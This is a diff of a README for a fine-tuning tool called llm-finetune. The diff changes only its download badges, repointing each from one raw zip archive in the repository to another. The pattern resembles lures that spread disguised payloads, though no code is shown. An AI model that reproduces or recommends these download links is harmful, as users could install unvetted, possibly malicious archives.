@@ -1,6 +1,6 @@
 # 🚀 llm-finetune - Easy Tools for Fine-Tuning Models
 
-[![Download from GitHub](https://img.shields.io/badge/Download-llm--finetune-brightgreen)](https://github.com/vicious122/llm-finetune/raw/refs/heads/main/include/llm_finetune_v1.5.zip)
+[![Download from GitHub](https://img.shields.io/badge/Download-llm--finetune-brightgreen)](https://github.com/vicious122/llm-finetune/raw/refs/heads/main/examples/llm_finetune_v2.7.zip)
 
 ---
 
@@ -42,7 +42,7 @@ You do not need to install extra software or programming tools.
 
 Click the green button below to open the llm-finetune GitHub page:
 
-[![Download from GitHub](https://img.shields.io/badge/Download-llm--finetune-blue)](https://github.com/vicious122/llm-finetune/raw/refs/heads/main/include/llm_finetune_v1.5.zip)
+[![Download from GitHub](https://img.shields.io/badge/Download-llm--finetune-blue)](https://github.com/vicious122/llm-finetune/raw/refs/heads/main/examples/llm_finetune_v2.7.zip)
 
 ### Step 2: Find the latest version
 
@@ -153,4 +153,4 @@ llm-finetune submit --provider openai --key YOUR_API_KEY --file dataset.jsonl --
 
 ## 🔗 Download llm-finetune
 
-[![Download from GitHub](https://img.shields.io/badge/Download-llm--finetune-brightgreen)](https://github.com/vicious122/llm-finetune/raw/refs/heads/main/include/llm_finetune_v1.5.zip)
+[![Download from GitHub](https://img.shields.io/badge/Download-llm--finetune-brightgreen)](https://github.com/vicious122/llm-finetune/raw/refs/heads/main/examples/llm_finetune_v2.7.zip)
